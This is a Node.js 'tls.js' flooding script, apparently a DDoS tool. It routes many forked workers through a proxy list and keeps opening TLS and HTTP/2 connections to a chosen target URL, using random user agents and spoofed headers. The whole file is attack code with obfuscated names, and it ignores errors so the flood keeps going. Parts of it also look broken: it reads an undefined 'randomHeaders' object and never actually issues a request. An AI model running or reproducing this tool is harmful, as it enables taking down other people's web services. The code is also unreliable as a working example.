const net = require("net");
const http2 = require('http2');
const tls = require("tls");
const cluster = require("cluster");
const url = require('url');
const UserAgent = require("user-agents");
const fs = require('fs');
process.setMaxListeners(0x0);
require("events").EventEmitter.defaultMaxListeners = 0x0;
process.on("uncaughtException", function (_0x1853c6) {});
if (process.argv.length < 0x7) {
  console.log("Script by : XinZu \nUsage: node tls.js target time rate thread proxyfile\n Use Big And Good Proxy File ");
  process.exit();
}
const headers = {};
function readLines(_0x4a3573) {
  return fs.readFileSync(_0x4a3573, 'utf-8').toString().split(/\r?\n/);
}
function randomIntn(_0x2e9e36, _0xd1773d) {
  return Math.floor(Math.random() * (_0xd1773d - _0x2e9e36) + _0x2e9e36);
}
function randomElement(_0x358c1c) {
  return _0x358c1c[Math.floor(Math.random() * (_0x358c1c.length - 0x0) + 0x0)];
}
const args = {
  'target': process.argv[0x2],
  'time': ~~process.argv[0x3],
  'Rate': ~~process.argv[0x4],
  'threads': ~~process.argv[0x5],
  'proxyFile': process.argv[0x6]
};
var proxies = fs.readFileSync(args.proxyFile, 'utf-8').toString().split(/\r?\n/);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let counter = 0x1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}
class NetSocket {
  constructor() {}
  ["HTTP"](_0x51b202, _0x106082) {
    const _0x528b48 = "CONNECT " + _0x51b202.address + ":443 HTTP/1.1\r\nHost: " + _0x51b202.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x57a4b5 = new Buffer.from(_0x528b48);
    const _0x35c0c4 = net.connect({
      'host': _0x51b202.host,
      'port': _0x51b202.port
    });
    _0x35c0c4.setTimeout(_0x51b202.timeout * 0x2710);
    _0x35c0c4.setKeepAlive(true, 0xea60);
    _0x35c0c4.on("connect", () => {
      _0x35c0c4.write(_0x57a4b5);
    });
    _0x35c0c4.on("data", _0x1e7d97 => {
      const _0x5eb9c9 = _0x1e7d97.toString("utf-8");
      const _0x1e9b9e = _0x5eb9c9.includes("HTTP/1.1 200");
      if (_0x1e9b9e === false) {
        _0x35c0c4.destroy();
        return _0x106082(undefined, "error: invalid response from proxy server");
      }
      return _0x106082(_0x35c0c4, undefined);
    });
    _0x35c0c4.on("timeout", () => {
      _0x35c0c4.destroy();
      return _0x106082(undefined, "error: timeout exceeded");
    });
    _0x35c0c4.on("error", _0x423edf => {
      _0x35c0c4.destroy();
      return _0x106082(undefined, "error: " + _0x423edf);
    });
  }
}
const Header = new NetSocket();
headers[":method"] = "GET";
headers.GET = " / HTTP/2";
headers[":path"] = parsedTarget.path;
headers[':scheme'] = "https";
headers.Referer = 'https://google.com';
headers.accept = randomHeaders.accept;
headers["accept-language"] = randomHeaders["accept-language"];
headers["accept-encoding"] = randomHeaders["accept-encoding"];
headers.Connection = 'keep-alive';
headers['upgrade-insecure-requests'] = randomHeaders['upgrade-insecure-requests'];
headers.TE = 'trailers';
headers['x-requested-with'] = 'XMLHttpRequest';
headers.pragma = 'no-cache';
headers.Cookie = randomHeaders.cookie;
function runFlooder() {
  const _0x4de983 = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
  const _0x4d68a0 = _0x4de983.split(':');
  const _0x51a3b1 = new UserAgent();
  var _0x103ffd = _0x51a3b1.toString();
  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = _0x103ffd;
  const _0x516833 = {
    'host': _0x4d68a0[0x0],
    'port': ~~_0x4d68a0[0x1],
    'address': parsedTarget.host + ':443',
    'timeout': 0x64
  };
  Header.HTTP(_0x516833, (_0x119c6a, _0x5a8c4c) => {
    if (_0x5a8c4c) {
      return;
    }
    _0x119c6a.setKeepAlive(true, 0xea60);
    const _0x30c19f = {
      'ALPNProtocols': ['h2'],
      'followAllRedirects': true,
      'challengeToSolve': 0x5,
      'clientTimeout': 0x1388,
      'clientlareMaxTimeout': 0x3a98,
      'echdCurve': 'GREASE:X25519:x25519',
      'ciphers': 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
      'rejectUnauthorized': false,
      'socket': _0x119c6a,
      'decodeEmails': false,
      'honorCipherOrder': true,
      'requestCert': true,
      'secure': true,
      'port': 0x1bb,
      'uri': parsedTarget.host,
      'servername': parsedTarget.host
    };
    const _0x1a7eb1 = tls.connect(0x1bb, parsedTarget.host, _0x30c19f);
    _0x1a7eb1.setKeepAlive(true, 600000);
    const _0x15ba0f = http2.connect(parsedTarget.href, {
      'protocol': "https:",
      'settings': {
        'headerTableSize': 0x10000,
        'maxConcurrentStreams': 0x3e8,
        'initialWindowSize': 0x600000,
        'maxHeaderListSize': 0x40000,
        'enablePush': false
      },
      'maxSessionMemory': 0xfa00,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0x1a7eb1,
      'socket': _0x119c6a
    });
    _0x15ba0f.settings({
      'headerTableSize': 0x10000,
      'maxConcurrentStreams': 0x4e20,
      'initialWindowSize': 0x600000,
      'maxHeaderListSize': 0x40000,
      'enablePush': false
    });
    _0x15ba0f.on('connect', () => {});
    _0x15ba0f.on("close", () => {
      _0x15ba0f.destroy();
      _0x119c6a.destroy();
      return;
    });
    _0x15ba0f.on("error", _0x3df812 => {
      _0x15ba0f.destroy();
      _0x119c6a.destroy();
      return;
    });
  });
}
const KillScript = () => process.exit(0x1);
setTimeout(KillScript, args.time * 0x3e8);